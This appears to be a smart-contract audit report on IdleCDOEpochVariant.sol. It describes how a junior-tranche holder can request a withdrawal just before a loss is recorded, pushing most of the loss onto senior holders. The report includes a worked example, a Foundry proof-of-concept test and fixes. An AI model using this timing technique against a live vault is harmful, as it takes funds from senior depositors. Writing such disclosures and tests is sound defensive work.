### Title
Junior tranche holders can convert active BB positions into loss-buffered withdrawal receipts before a lossy epoch stop - (File: contracts/IdleCDOEpochVariant.sol)

### Summary
A BB holder can request a withdrawal during the buffer phase, removing their position from active BB NAV before `stopEpochWithDuration` crystallizes a realized loss. The withdrawal receipt is then placed in an aggregate `pendingWithdraws` bucket with no tranche identity and receives only its proportional share of the loss, while the remaining loss is applied to active tranches using the normal BB-first waterfall.

### Finding Description
`IdleCDOEpochVariant.requestWithdraw` burns the caller's tranche tokens, removes the underlying amount from the corresponding tranche NAV, and creates an address-bound receipt in `IdleCreditVault`. [1](#0-0) 

For ordinary withdrawals, `IdleCreditVault.requestWithdraw` mints the user a receipt and increases aggregate `pendingWithdraws`, but does not retain whether the receipt originated from AA or BB. [2](#0-1) 

When a subsequent `stopEpochWithDuration` supplies `_lossAmount`, `previewLossAdjustedWithdrawFunds` splits that loss pro rata between the entire pending-receipt basis and the active-position basis. [3](#0-2) 

Only the remaining `activeLoss` is burned from CDO-held strategy tokens and pushed through `_forceUpdateAccounting`, where the ordinary waterfall applies losses to BB before AA. [4](#0-3) [5](#0-4) 

This creates a bad-debt escape path: a junior holder who expects the next epoch settlement to contain a loss can request a withdrawal during the preceding buffer phase and convert a fully BB-exposed position into a receipt exposed only pro rata.

### Impact Explanation
The broken invariant is the tranche loss waterfall: BB principal should absorb losses before AA principal.

Example:

- Active NAV: 900,000 AA and 100,000 BB.
- The sole BB holder requests withdrawal of all 100,000 during the buffer.
- A 100,000 loss is later supplied to `stopEpochWithDuration`.
- Pending receipt basis is approximately 100,000 and active basis is approximately 900,000.
- `pendingLoss = 100,000 * 100,000 / 1,000,000 = 10,000`.
- The BB-origin receipt loses only about 10%.
- The remaining approximately 90,000 loss is applied to active positions; because BB NAV was removed, it reaches AA.

The attacker converts an expected near-total junior loss into a pro-rata haircut and causes senior holders to absorb loss that should have been borne by BB. The attacker only needs to be a KYC-passing tranche holder able to call `requestWithdraw`; epoch settlement and the reported loss are performed by honest privileged roles.

### Likelihood Explanation
The attack is available whenever withdrawal requests are enabled during the buffer and a tranche holder can anticipate that the next settlement will include a realized loss. Credit impairments, borrower distress, defaulted obligations, or off-chain restructurings can become known before the manager calls `stopEpochWithDuration`.

Existing checks do not prevent it:

- `requestWithdraw` is permissioned only by the AA/BB request flags and wallet allowlist. [6](#0-5) 
- Pending receipts are expressly documented as having no tranche identity. [7](#0-6) 
- The proportional pending-receipt loss calculation is unconditional once loss accounting is initialized. [8](#0-7) 

### Recommendation
Preserve tranche identity for withdrawal receipts, or assign pending-receipt losses according to the tranche class that created each receipt.

At minimum:

- Track pending withdrawal basis separately for AA-origin and BB-origin receipts.
- Apply losses to BB-origin pending receipts before AA-origin pending receipts and active AA.
- Alternatively, delay burning tranche tokens/removing tranche NAV until the pending withdrawal is funded, so the position remains subject to the correct waterfall while the loss is crystallized.
- Add regression tests where a BB holder requests withdrawal immediately before a `stopEpochWithDuration` loss and assert that BB cannot reduce its loss share below the junior-first amount.

### Proof of Concept
The following Foundry test sketch uses the repository’s credit-vault test model. It shows a BB holder withdrawing during the buffer before a lossy stop, resulting in most of the nominal junior loss being pushed onto active AA.

```solidity
// test/foundry/BBPendingWithdrawalLossEscape.t.sol
function testBBRequestEscapesJuniorFirstLoss() public {
    uint256 aaAmount = 900_000 * ONE_SCALE;
    uint256 bbAmount = 100_000 * ONE_SCALE;

    address aaUser = makeAddr("aaUser");
    address bbAttacker = makeAddr("bbAttacker");

    _depositWithUser(aaUser, aaAmount, true);
    uint256 bbMinted = _depositWithUser(bbAttacker, bbAmount, false);

    _startEpochAndCheckPrices(0);

    // Epoch ends; buffer opens. Withdrawal requests are enabled.
    vm.warp(cdoEpoch.epochEndDate() + 1);
    deal(defaultUnderlying, borrower, cdoEpoch.expectedEpochInterest());
    vm.prank(manager);
    cdoEpoch.stopEpoch(initialProvidedApr, 0);

    // The BB holder converts all active junior NAV into a tranche-agnostic receipt.
    uint256 activeBeforeLoss = cdoEpoch.getContractValue();
    vm.prank(bbAttacker);
    uint256 receipt = cdoEpoch.requestWithdraw(bbMinted, address(BBtranche));

    uint256 pendingBasis = strategy.pendingWithdraws();
    uint256 activeBasis = activeBeforeLoss - bbAmount;

    // Start the following epoch, then crystallize a loss equal to original BB NAV.
    _startEpochAndCheckPrices(1);
    vm.warp(cdoEpoch.epochEndDate() + 1);

    uint256 lossAmount = bbAmount;
    uint256 expectedPendingLoss =
        lossAmount * pendingBasis / (pendingBasis + activeBasis);

    // Honest borrower funds the loss-adjusted pending amount.
    (uint256 pendingToFund,) =
        strategy.previewLossAdjustedWithdrawFunds(lossAmount);
    uint256 repay = cdoEpoch.expectedEpochInterest() + pendingToFund;
    deal(defaultUnderlying, borrower, repay);
    vm.prank(borrower);
    IERC20Detailed(defaultUnderlying).approve(address(cdoEpoch), repay);

    uint256 aaPriceBefore = cdoEpoch.virtualPrice(address(AAtranche));
    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(
        initialProvidedApr,
        0,
        cdoEpoch.epochDuration(),
        lossAmount
    );

    // The receipt absorbed only the aggregate pending share rather than BB-first loss.
    uint256 receiptRecovery =
        strategy.lossRecoveryPriceByEpoch(strategy.epochNumber());
    assertApproxEqAbs(
        receipt * (1e18 - receiptRecovery) / 1e18,
        expectedPendingLoss,
        10
    );

    // The remaining loss reduced active AA, even though the original BB NAV
    // was sufficient to absorb the entire loss.
    assertLt(cdoEpoch.virtualPrice(address(AAtranche)), aaPriceBefore);
    assertLt(expectedPendingLoss, lossAmount);
}
```

```text
  function previewLossAdjustedWithdrawFunds(uint256 _lossAmount) external view returns (uint256 pendingToFund, uint256 activeLoss) {
    uint256 pendingBasis = pendingWithdraws;
    // Full zero-loss funding is safe for legacy aggregate receipts and needs no migration call.
    if (_lossAmount == 0) return (pendingBasis, _lossAmount);

    IIdleCDOEpochVariant cdo = IIdleCDOEpochVariant(idleCDO);
    uint256 activeBasis = _lossActiveBasis(cdo);
    if (pendingBasis == 0) {
      if (_lossAmount > activeBasis) revert NotAllowed();
      return (0, _lossAmount);
    }

    // Legacy pending receipts do not have the per-epoch ownership data needed to store a haircut.
    if (!defaultRecoveryInitialized) revert NotAllowed();
    uint256 totalBasis = activeBasis + pendingBasis;
    if (_lossAmount >= totalBasis) revert NotAllowed();

    uint256 pendingLoss = _lossAmount * pendingBasis / totalBasis;
    pendingToFund = pendingBasis - pendingLoss;
    activeLoss = _lossAmount - pendingLoss;
```
